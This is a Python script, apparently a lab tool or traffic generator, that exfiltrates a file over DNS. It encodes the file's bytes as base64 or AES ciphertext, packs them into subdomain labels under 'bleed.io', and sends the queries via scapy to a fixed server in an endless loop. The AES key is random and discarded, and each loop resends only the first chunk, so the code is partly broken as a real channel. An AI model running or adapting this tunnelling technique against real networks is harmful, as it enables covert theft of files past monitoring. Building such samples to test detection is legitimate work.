import base64
import random
from scapy.all import DNS, DNSQR, IP, UDP, send
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import sys, os 

dns_server = "192.168.64.26"
tld = "bleed.io"
file_path = str(sys.argv[1])
max_domain_length = 253
max_label_length = 63
max_labels = 125  # Allowing 125 labels for subdomains to stay within 127 labels total
tld_length = len(tld) + 1  # "bleed.io" plus the dot

def encode_base64(data):
    return base64.urlsafe_b64encode(data).decode('utf-8').strip("=")

def encrypt_aes_base64(data):
    key = get_random_bytes(16)  # AES key (128 bits)
    cipher = AES.new(key, AES.MODE_CBC, iv=get_random_bytes(16))
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    return base64.urlsafe_b64encode(encrypted_data).decode('utf-8').strip("=")

with open(file_path, "rb") as f:
    file_data = f.read()

def send_dns_queries():
    while True:
        if random.choice([True, False]):
            encoded_data = encode_base64(file_data)
        else:
            encoded_data = encrypt_aes_base64(file_data)

        subdomains = []
        remaining_length = max_domain_length - tld_length  # Account for the TLD length

        i = 0
        while i < len(encoded_data) and len(subdomains) < max_labels:
            label_length = random.randint(5, min(remaining_length, max_label_length)) if remaining_length > 5 else remaining_length
            label = encoded_data[i:i + label_length]
            subdomains.append(label)
            i += label_length
            remaining_length -= (len(label) + 1)  # Account for the dot separator

            if remaining_length <= 0:
                break
        domain = ".".join(subdomains) + "." + tld
        print(f"Sending DNS query for domain: {domain}")

        dns_request = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
        send(dns_request,iface='enp0s1', verbose=0)

if __name__ == "__main__":
    send_dns_queries()
